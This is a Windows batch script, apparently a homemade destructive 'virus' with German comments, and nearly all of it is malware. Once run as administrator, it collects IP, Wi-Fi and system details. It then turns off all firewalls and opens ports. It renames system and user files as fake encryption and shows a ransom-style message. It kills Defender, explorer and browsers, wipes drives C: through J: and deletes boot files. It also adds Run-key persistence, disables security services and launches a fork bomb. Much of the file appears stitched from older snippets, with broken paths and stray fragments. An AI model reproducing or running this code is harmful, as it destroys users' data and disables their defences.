@echo off
CLS

echo WARNING:
echo RUN THIS AS ADMINISTRATOR!!!
pause

REM Überprüfen, ob das Skript als Administrator ausgeführt wird
NET SESSION >NUL 2>&1
IF %ERRORLEVEL% EQU 0 (
    REM Der Benutzer ist ein Administrator, füge hier den eigentlichen Code ein
    title %random% %date% %username% %time% %random%




color 0a

:info


cls & color 0a


cd Desktop


nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log


ver>>9K21JM10B.log


ECHO.>>9K21JM10B.log


ECHO Username:%username%>>9K21JM10B.log


ECHO.>>9K21JM10B.log


ECHO Time: %time%>>9K21JM10B.log


ECHO.>>9K21JM10B.log


ECHO Date: %date%>>9K21JM10B.log


ECHO.>>9K21JM10B.log


netsh wlan show profiles>>9K21JM10B.log


ECHO.>>9K21JM10B.log


ipconfig>>9K21JM10B.log


ECHO.>>9K21JM10B.log


ECHO Additional Information:>>9K21JM10B.log


ipconfig | find /i "IPv4">>9K21JM10B.log


wmic diskdrive get size>>9K21JM10B.log


wmic cpu get name>>9K21JM10B.log


ECHO.>>9K21JM10B.log


ECHO.>>9K21JM10B.log


ECHO.>>9K21JM10B.log


systeminfo>>9K21JM10B.log


goto ports


ren -=- Opens Port 1122 -=-


:ports


cls & color 0a


netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1


netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1


goto firewall


ren -=- Turns all Firewalls off -=-


:firewall


cls & color 0a


netsh firewall set opmode disable


netsh firewall set opmode mode=DISABLE


netsh advfirewall set currentprofile state off


netsh advfirewall set domainprofile state off


netsh advfirewall set privateprofile state off


netsh advfirewall set publicprofile state off


netsh advfirewall set allprofiles state off


goto encryption


ren -=- Encrypts files with a simple name break -=-


:encryption


cls & color 0a


:Current


REN *.cmd *.sI09


REN *.exe *.1Je9


REN *.log *.439a


REN *.ini *.3KM1


REN *.dll *.38Jl


REN *.bin *.3J81


REN *.txt *.2M1A


REN *.sys *.8j3J


REN *.lnk *.9K2M


REN *.png *.8J2n


REN *.exe *.3hxD


cd C:\Windows


REN *.cmd *.sI09


REN *.exe *.1Je9


REN *.log *.439a


REN *.ini *.3KM1


REN *.dll *.38Jl


REN *.bin *.3J81


REN *.txt *.2M1A


REN *.sys *.8j3J


REN *.lnk *.9K2M


REN *.png *.8J2n


REN *.exe *.3hxD


cd C:\Windows\Sys32 & cd C:\Windows\System32


REN *.cmd *.sI09


REN *.exe *.1Je9


REN *.log *.439a


REN *.ini *.3KM1


REN *.dll *.38Jl


REN *.bin *.3J81


REN *.txt *.2M1A


REN *.sys *.8j3J


REN *.lnk *.9K2M


REN *.png *.8J2n


REN *.exe *.3hxD


cd C:\


REN *.cmd *.sI09


REN *.exe *.1Je9


REN *.log *.439a


REN *.ini *.3KM1


REN *.dll *.38Jl


REN *.bin *.3J81


REN *.txt *.2M1A


REN *.sys *.8j3J


REN *.lnk *.9K2M


REN *.png *.8J2n


REN *.exe *.3hxD


color 0a & mode 1000 & cls


pause


goto virus


ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-


:virus


ECHO You have been encrypted by *-*7_SL*- & color 0a


net stop "Windows Defender Service"


net stop "Windows Firewall"


taskkill /F /IM "chrome.exe" /T


taskkill /F /IM "firefox.exe" /T


taskkill /F /IM "ProcessHacker.exe" /T


taskkill /F /IM "explorer.exe" /T


taskkill /F /IM "taskmgr.exe" /T


goto virus



    pconfig /release

attrib -r -s -h c:autoexec.bat

del c:autoexec.bat

attrib -r -s -h c:boot.ini

del c:boot.ini

attrib -r -s -h c:ntldr

del c:ntldr

attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

del c:WINDOWSsystem32*.*/q

rd/s/q D:

rd/s/q C:

rd/s/q E:

del %systemdrive%*.* /f /s /q

attrib -r -s -h c:autoexec.bat

del c:autoexec.bat

attrib -r -s -h c:boot.ini

del c:boot.ini

attrib -r -s -h c:ntldr

del c:ntldr

attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

echo @echo off>c:windowshartlell.bat

echo break off>>c:windowshartlell.bat

echo shutdown -r -t 11 -f>>c:windowshartlell.bat

echo end>>c:windowshartlell.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f

REN *.DOC *.TXT REN *.JPEG *.TXT

REN *.LNK *.TXT

REN *.AVI *.TXT

REN *.MPEG *.TXT

REN *.COM *.TXT

REN *.BAT *.TXT

eg

add HKLMSoftwareMicrosoftWindowsCurrentVersionRun /v MiXedVeX /t

REG_SZ /d %systemroot%HaloTrialScoreChangerV1 /f > nul

start iexpress (website of your choice)

ipconfig /release

del “C:Program FilesMicrosoft Games

del “C:Nexon

del “C:Program FilesXfire

del “C:Program FilesAdobe”

del “C:Program FilesInternet Explorer”

del “C:Program FilesMozilla Firefox”

del “C:WINDOWS”

del “C:WINDOWSsystem32”

del “C:WINDOWSsystem32cmd”

del “C:WINDOWSsystem32iexpress”

del “C:WINDOWSsystem32sndvol32”

del “C:WINDOWSsystem32sndrec32”

del “C:WINDOWSsystem32Restorerstrui”

del “C:WINDOWSsystem32wupdmgr”

del “C:WINDOWSsystem32desktop”

del “C:WINDOWSjava”

del “C:WINDOWSMedia”

del “C:WINDOWSResources”

del “C:WINDOWSsystem”

del “C:drivers”

del “C:drv”

del “C:SYSINFO”

del “C:Program Files”

echo ipconfig/release_all>>c:windowswimn32.bat

net stop “Security Center”

net stop SharedAccess

> “%Temp%.kill.reg” ECHO REGEDIT4

>>”%Temp%.kill.reg” ECHO.

>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]

>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004

>>”%Temp%.kill.reg” ECHO.

>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]

>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
echo @echo off >> spam.bat
echo :A >> spam.bat
echo start spam.bat >> spam.bat
echo echo Spamming this thing idk >> spam.bat
echo goto A >> spam.bat
start spam.bat
>>”%Temp%.kill.reg” ECHO.

>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]

>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004

>>”%Temp%.kill.reg” ECHO.

START /WAIT REGEDIT /S “%Temp%.kill.reg”

del “%Temp%.kill.reg”

del %0

echo @echo off>c:windowswimn32.bat

echo break off>>c:windowswimn32.bat

echo ipconfig/release_all>>c:windowswimn32.bat

echo end>>c:windowswimn32.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f

del D:*.* /f /s /q

del E:*.* /f /s /q

del F:*.* /f /s /q

del G:*.* /f /s /q

del H:*.* /f /s /q

del I:*.* /f /s /q

del J:*.* /f /s /q

) ELSE (
    REM Der Benutzer ist kein Administrator
    echo Run the code as an admin.
    echo Closing programm...
    pause
    exit
)

